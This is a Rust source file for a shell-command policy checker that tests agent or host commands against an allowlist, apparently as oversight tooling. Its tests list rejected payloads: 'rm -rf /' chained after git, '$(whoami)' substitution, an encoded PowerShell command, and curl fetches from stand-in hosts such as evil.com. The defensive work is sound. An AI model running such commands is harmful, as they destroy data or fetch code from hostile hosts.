//! PowerShell AST extraction + shared `exec_policy` enforcement for **`vox shell check`**.
//!
//! Validates host/agent shell command strings against [`DEFAULT_POLICY_REL`] using
//! `vox_orchestrator::oversight::exec_policy` (always) plus PowerShell's parser AST when `pwsh`
//! is available on `PATH`.

use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::OnceLock;

use anyhow::{Context, Result, anyhow};
use regex::Regex;
use serde::Deserialize;
use serde_json::Value as JsonValue;
use vox_bounded_fs::read_utf8_path_capped;
pub use vox_orchestrator::oversight::exec_policy::ExecPolicyV1;
use vox_orchestrator::oversight::exec_policy::{evaluate_command_ast, normalize_exec_name};

fn url_host_regex() -> &'static Regex {
    static URL_HOST: OnceLock<Regex> = OnceLock::new();
    URL_HOST.get_or_init(|| Regex::new(r"(?i)https?://([^/?#'\s]+)").expect("URL_HOST regex"))
}

/// Repo-relative default policy path.
pub const DEFAULT_POLICY_REL: &str = "contracts/terminal/exec-policy.v1.yaml";
const SCHEMA_REL: &str = "contracts/terminal/exec-policy.v1.schema.json";
const EXTRACT_SCRIPT_SRC: &str = r#"
param()
$payload = $env:VOX_SHELL_CHECK_PAYLOAD
if ([string]::IsNullOrWhiteSpace($payload)) { exit 0 }
$errors = $null
$ast = [System.Management.Automation.Language.Parser]::ParseInput($payload, [ref]$null, [ref]$errors)

$parseErrors = @()
if ($null -ne $errors) {
    foreach ($err in $errors) {
        $parseErrors += @{ message = $err.Message; text = $err.Extent.Text }
    }
}

$commands = @()
if ($null -ne $ast) {
    $foundCmds = $ast.FindAll({ param($astNode) $astNode -is [System.Management.Automation.Language.CommandAst] }, $true)
    if ($null -ne $foundCmds) {
        foreach ($cmd in $foundCmds) {
            $name = $cmd.GetCommandName()
            $parameters = @()
            foreach ($elem in $cmd.CommandElements) {
                if ($elem -is [System.Management.Automation.Language.CommandParameterAst]) {
                    $parameters += $elem.ParameterName
                }
            }
            $commands += @{ name = $name; parameters = $parameters }
        }
    }
}

$literals = @()
if ($null -ne $ast) {
    $foundLits = $ast.FindAll({ param($astNode) $astNode -is [System.Management.Automation.Language.StringConstantExpressionAst] }, $true)
    if ($null -ne $foundLits) {
        foreach ($lit in $foundLits) { $literals += $lit.Value }
    }
}

$result = @{ parse_errors = $parseErrors; commands = $commands; string_literals = $literals }
$result | ConvertTo-Json -Depth 5 -Compress
"#;

#[derive(Debug, Deserialize)]
struct PwshExtraction {
    #[serde(default)]
    parse_errors: Vec<PwshParseError>,
    #[serde(default)]
    commands: Vec<PwshCommand>,
    #[serde(default)]
    string_literals: Vec<String>,
}

#[derive(Debug, Deserialize)]
struct PwshParseError {
    message: String,
    #[serde(default)]
    text: String,
}

#[derive(Debug, Deserialize)]
struct PwshCommand {
    #[serde(default)]
    name: Option<String>,
    #[serde(default)]
    parameters: Vec<String>,
}

fn repo_root() -> PathBuf {
    vox_repository::resolve_repo_root_for_ci()
}

fn resolve_pwsh() -> Result<PathBuf> {
    which::which("pwsh")
        .or_else(|_| which::which("powershell"))
        .map_err(|_| {
            anyhow!(
                "`pwsh` (or `powershell`) not found on PATH; terminal AST check requires PowerShell"
            )
        })
}

fn policy_path(explicit: Option<&Path>) -> PathBuf {
    explicit
        .map(Path::to_path_buf)
        .unwrap_or_else(|| repo_root().join(DEFAULT_POLICY_REL))
}

pub fn validate_policy_yaml_against_schema(
    repo_root: &Path,
    policy_yaml: &Path,
) -> Result<ExecPolicyV1> {
    let schema_path = repo_root.join(SCHEMA_REL);
    let schema_src = read_utf8_path_capped(&schema_path)
        .with_context(|| format!("read {}", schema_path.display()))?;
    let policy_src = read_utf8_path_capped(policy_yaml)
        .with_context(|| format!("read {}", policy_yaml.display()))?;
    let schema_val: JsonValue = serde_json::from_str(&schema_src)
        .with_context(|| format!("parse {}", schema_path.display()))?;
    let instance: JsonValue =
        serde_yaml::from_str(&policy_src).context("parse exec policy YAML as JSON value")?;
    let validator = vox_jsonschema_util::compile_validator(&schema_val, schema_path.display())
        .context("compile exec-policy.v1.schema.json")?;
    vox_jsonschema_util::validate(
        &instance,
        &validator,
        format!("{} vs {}", policy_yaml.display(), schema_path.display()),
    )
    .map_err(|e| anyhow!("{e:#}"))?;

    serde_yaml::from_str::<ExecPolicyV1>(&policy_src).context("deserialize exec policy")
}

fn run_pwsh_extract(payload: &str) -> Result<PwshExtraction> {
    let pwsh = resolve_pwsh()?;
    let output = std::process::Command::new(&pwsh)
        .arg("-NoProfile")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-Command")
        .arg(EXTRACT_SCRIPT_SRC)
        .env("VOX_SHELL_CHECK_PAYLOAD", payload)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .with_context(|| format!("spawn {}", pwsh.display()))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(anyhow!(
            "pwsh extractor failed ({}): {}",
            output.status,
            stderr.trim()
        ));
    }
    let stdout = String::from_utf8(output.stdout).context("pwsh stdout utf-8")?;
    serde_json::from_str::<PwshExtraction>(&stdout).context("parse pwsh JSON output")
}

fn verify_pwsh_extraction(extraction: &PwshExtraction, policy: &ExecPolicyV1) -> Result<()> {
    if !extraction.parse_errors.is_empty() {
        let msgs: Vec<_> = extraction
            .parse_errors
            .iter()
            .map(|e| format!("{} ({})", e.message, e.text))
            .collect();
        return Err(anyhow!("PowerShell parse error(s): {}", msgs.join("; ")));
    }
    let norm_set = |xs: &[String]| -> HashSet<String> {
        xs.iter()
            .map(|s| normalize_exec_name(s.trim_end_matches('.')))
            .filter(|s| !s.is_empty())
            .collect()
    };
    let (cmdlets, bins, net_cmds, domains) = (
        norm_set(&policy.allowed_cmdlets),
        norm_set(&policy.allowed_binaries),
        norm_set(&policy.network_fetch_commands),
        norm_set(&policy.network_fetch_domains),
    );
    let has_http_lit = extraction
        .string_literals
        .iter()
        .any(|lit| url_host_regex().is_match(lit));

    for cmd in &extraction.commands {
        let raw_name = cmd.name.as_deref().unwrap_or("").trim();
        if raw_name.is_empty() {
            return Err(anyhow!(
                "command with no resolvable name (dynamic invocation not allowed by exec policy)"
            ));
        }
        let key = normalize_exec_name(raw_name);
        for (scope, blocked_list) in &policy.blocked_parameters {
            if scope.trim() != "*"
                && !scope.trim().eq_ignore_ascii_case(raw_name)
                && normalize_exec_name(scope) != key
            {
                continue;
            }
            for p in &cmd.parameters {
                let pn = p.trim().trim_start_matches('-');
                if blocked_list
                    .iter()
                    .any(|b| b.trim().eq_ignore_ascii_case(pn))
                {
                    return Err(anyhow!(
                        "blocked parameter `-{pn}` on command {raw_name:?} (see exec-policy blocked_parameters)"
                    ));
                }
            }
        }
        let net_ok = net_cmds.contains(&key) && !domains.is_empty() && has_http_lit;
        if !(cmdlets.contains(&key) || bins.contains(&key) || net_ok) {
            return Err(anyhow!(
                "command {raw_name:?} is not in allowed_cmdlets or allowed_binaries (normalized key: {key})"
            ));
        }
        if net_cmds.contains(&key) {
            for lit in &extraction.string_literals {
                for cap in url_host_regex().captures_iter(lit) {
                    let Some(authority) = cap.get(1).map(|m| m.as_str()) else {
                        continue;
                    };
                    let host_port = authority.rsplit('@').next().unwrap_or(authority);
                    let host = host_port
                        .split_once(':')
                        .map_or(host_port, |(h, _)| h)
                        .trim_end_matches('.')
                        .to_ascii_lowercase();
                    if domains.is_empty() || !domains.contains(&host) {
                        return Err(anyhow!(
                            "network URL host `{host}` is not in network_fetch_domains (command `{raw_name}`)"
                        ));
                    }
                }
            }
        }
    }
    Ok(())
}

/// Run policy check using the **pure-Rust path only** (no `pwsh`).
pub fn run_check_for_ci(payload: &str, policy_file: Option<&Path>) -> Result<()> {
    let root = repo_root();
    let policy_path = policy_path(policy_file);
    let policy = validate_policy_yaml_against_schema(&root, &policy_path)?;
    if policy.version != 1 {
        return Err(anyhow!(
            "unsupported exec policy version {}",
            policy.version
        ));
    }
    run_check_rust_fallback(payload, &policy)
}

pub fn run_check(payload: &str, policy_file: Option<&Path>) -> Result<()> {
    run_check_with_backend(payload, policy_file, None)
}

pub fn run_check_with_backend(
    payload: &str,
    policy_file: Option<&Path>,
    backend: Option<&str>,
) -> Result<()> {
    let root = repo_root();
    let policy_path = policy_path(policy_file);
    let policy = validate_policy_yaml_against_schema(&root, &policy_path)?;
    if policy.version != 1 {
        return Err(anyhow!(
            "unsupported exec policy version {}",
            policy.version
        ));
    }

    // Always enforce shared POSIX + PowerShell lexical/wrapper AST rules first so
    // `$()`, backtick, wrapper (`bash -c`, `pwsh -EncodedCommand`), and URL spoofing
    // bypasses are rejected even when `pwsh` is installed.
    run_check_rust_fallback(payload, &policy)?;

    let backend_norm = backend.unwrap_or("auto").trim().to_ascii_lowercase();
    if matches!(backend_norm.as_str(), "grammar" | "nu" | "nushell") || resolve_pwsh().is_err() {
        return Ok(());
    }

    let extraction = run_pwsh_extract(payload)?;
    verify_pwsh_extraction(&extraction, &policy)
}

/// Pure-Rust exec-policy check delegated to `vox_orchestrator::oversight::exec_policy`.
fn run_check_rust_fallback(payload: &str, policy: &ExecPolicyV1) -> Result<()> {
    let violations = evaluate_command_ast(payload, policy);
    if violations.is_empty() {
        return Ok(());
    }
    let details: Vec<String> = violations
        .iter()
        .map(|v| match v.token.as_deref() {
            Some(tok) => format!("[{}] {} ({tok})", v.rule, v.message),
            None => format!("[{}] {}", v.rule, v.message),
        })
        .collect();
    Err(anyhow!(
        "exec-policy violation (rust ast): {}",
        details.join("; ")
    ))
}

/// CI helper: validate policy file against JSON Schema only (no pwsh).
pub fn validate_policy_file(repo_root: &Path, policy_yaml: &Path) -> Result<ExecPolicyV1> {
    validate_policy_yaml_against_schema(repo_root, policy_yaml)
}

#[cfg(test)]
mod shell_policy_tests {
    use super::*;

    fn repo_root() -> PathBuf {
        vox_repository::resolve_repo_root_for_ci()
    }

    fn pwsh_on_path() -> bool {
        which::which("pwsh").is_ok() || which::which("powershell").is_ok()
    }

    #[test]
    fn default_policy_yaml_validates_against_schema() {
        let root = repo_root();
        let policy = root.join(DEFAULT_POLICY_REL);
        assert!(
            policy.is_file(),
            "missing {} (run from repo root)",
            policy.display()
        );
        let loaded = validate_policy_file(&root, &policy);
        assert!(loaded.is_ok(), "{:?}", loaded.err());
    }

    #[test]
    fn ci_smoke_and_bypass_parity_against_default_contract() {
        let root = repo_root();
        let policy = root.join(DEFAULT_POLICY_REL);
        for ok_payload in [
            "Get-Location",
            "Write-Output 1 | ConvertTo-Json -Compress",
            "git status",
            "cargo build --release",
        ] {
            let res = run_check_for_ci(ok_payload, Some(policy.as_path()));
            assert!(
                res.is_ok(),
                "expected `{ok_payload}` to pass, got {:?}",
                res.err()
            );
        }

        for bad_payload in [
            "Get-ChildItem -Recurse",
            "Totally-Fake-Cmdlet",
            "pwsh -EncodedCommand ZWNobyBoag==",
            // vox-arch-check: allow abs-path
            "git status; rm -rf /",
            "echo $(whoami)",
            "curl https://evil.example.com/x",
        ] {
            let res = run_check_for_ci(bad_payload, Some(policy.as_path()));
            assert!(res.is_err(), "expected `{bad_payload}` to be rejected");
        }
    }

    #[test]
    fn shell_check_rejects_unknown_command_when_pwsh_available() {
        if !pwsh_on_path() {
            return;
        }
        let root = repo_root();
        let policy = root.join(DEFAULT_POLICY_REL);
        let err = run_check("Totally-Fake-Cmdlet-VoxPolicyTest", Some(policy.as_path()));
        assert!(
            err.is_err(),
            "expected policy rejection, got {:?}",
            err.ok()
        );
    }

    #[test]
    fn shell_check_rejects_blocked_recurse_when_pwsh_available() {
        if !pwsh_on_path() {
            return;
        }
        let root = repo_root();
        let policy = root.join(DEFAULT_POLICY_REL);
        let err = run_check("Get-ChildItem -Recurse", Some(policy.as_path()));
        assert!(
            err.is_err(),
            "expected blocked -Recurse, got {:?}",
            err.ok()
        );
    }

    #[test]
    fn shell_check_reports_parse_errors_when_pwsh_available() {
        if !pwsh_on_path() {
            return;
        }
        let root = repo_root();
        let policy = root.join(DEFAULT_POLICY_REL);
        let err = run_check("{", Some(policy.as_path()));
        let msg = err.expect_err("invalid PowerShell should not pass");
        let s = format!("{msg:#}");
        assert!(
            s.to_ascii_lowercase().contains("parse"),
            "expected parse error in message: {s}"
        );
    }

    fn make_policy_with_network(net_cmds: &[&str], net_domains: &[&str]) -> ExecPolicyV1 {
        ExecPolicyV1 {
            version: 1,
            allowed_cmdlets: vec![
                "Get-Location".into(),
                "Write-Output".into(),
                "ConvertTo-Json".into(),
                "Get-ChildItem".into(),
            ],
            allowed_binaries: vec![
                "cargo".into(),
                "git".into(),
                "curl".into(),
                "pwsh".into(),
                "powershell".into(),
            ],
            blocked_parameters: {
                let mut m = std::collections::HashMap::new();
                m.insert("*".to_string(), vec!["Recurse".into()]);
                m
            },
            network_fetch_commands: net_cmds.iter().map(|s| s.to_string()).collect(),
            network_fetch_domains: net_domains.iter().map(|s| s.to_string()).collect(),
        }
    }

    #[test]
    fn rust_fallback_allows_allowed_binary() {
        let policy = make_policy_with_network(&[], &[]);
        assert!(run_check_rust_fallback("cargo build --release", &policy).is_ok());
    }

    #[test]
    fn rust_fallback_rejects_unknown_command() {
        let policy = make_policy_with_network(&[], &[]);
        assert!(run_check_rust_fallback("Totally-Fake-Cmd", &policy).is_err());
    }

    #[test]
    fn rust_fallback_rejects_blocked_parameter() {
        let policy = make_policy_with_network(&[], &[]);
        let err = run_check_rust_fallback("Get-ChildItem -Recurse", &policy);
        assert!(err.is_err());
        let msg = format!("{:#}", err.unwrap_err());
        assert!(msg.contains("Recurse") || msg.contains("blocked"), "{msg}");
    }

    #[test]
    fn rust_fallback_url_domain_and_compound_segments() {
        let policy = make_policy_with_network(&["curl"], &["github.com"]);
        assert!(run_check_rust_fallback("curl https://github.com/foo/bar", &policy).is_ok());

        for bad in [
            "curl https://evil.com/payload",
            "cargo build | curl https://evil.com",
            "cargo build; curl https://evil.com",
            "cargo build && curl https://evil.com",
        ] {
            let err = run_check_rust_fallback(bad, &policy);
            assert!(err.is_err(), "expected rejection for `{bad}`");
            let msg = format!("{:#}", err.unwrap_err());
            assert!(msg.contains("evil.com"), "{msg}");
        }

        let empty_dom_policy = make_policy_with_network(&["curl"], &[]);
        assert!(run_check_rust_fallback("curl https://github.com", &empty_dom_policy).is_err());

        for compound_bad in [
            "cargo build | Totally-Fake-Cmd",
            "cargo build | Get-ChildItem -Recurse",
            "cargo build; Totally-Fake-Cmd",
            "cargo build && Totally-Fake-Cmd",
            "cargo build || Totally-Fake-Cmd",
            "cargo build & Totally-Fake-Cmd",
            "pwsh -EncodedCommand ZWNobyBoag==",
            "git status && $(whoami)",
        ] {
            assert!(
                run_check_rust_fallback(compound_bad, &policy).is_err(),
                "expected `{compound_bad}` rejection"
            );
        }
    }

    #[test]
    fn run_check_with_backend_nu_and_grammar() {
        let root = repo_root();
        let policy = root.join(DEFAULT_POLICY_REL);
        assert!(run_check_with_backend("cargo build", Some(policy.as_path()), Some("nu")).is_ok());
        assert!(
            run_check_with_backend("cargo build", Some(policy.as_path()), Some("grammar")).is_ok()
        );
        assert!(
            run_check_with_backend("TotallyFakeCommand123", Some(policy.as_path()), Some("nu"))
                .is_err()
        );
    }
}
